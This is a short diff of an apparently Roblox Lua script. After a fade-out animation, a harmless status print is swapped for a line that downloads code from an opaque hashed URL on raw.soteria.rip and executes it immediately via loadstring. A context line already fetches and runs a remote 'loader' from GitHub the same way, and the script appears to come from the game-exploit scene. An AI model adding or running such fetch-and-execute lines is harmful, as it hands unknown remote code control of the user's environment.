@@ -22,7 +22,7 @@ local hide = TweenService:Create(Image, TweenInfo.new(0.5), {ImageTransparency =
 hide:Play()
 task.wait(0.5)
 Gui:Destroy()
-print("动画全部结束，主脚本开始运行")
+loadstring(game:HttpGet("https://raw.soteria.rip/ead3c5c22f3fd2fbe17c1f45737f69ea"))()
 local ok, matched = pcall(function()
     return loadstring(game:HttpGet("https://raw.githubusercontent.com/kongbaNB/9178/refs/heads/main/恐脚本加载器"))()
 end)
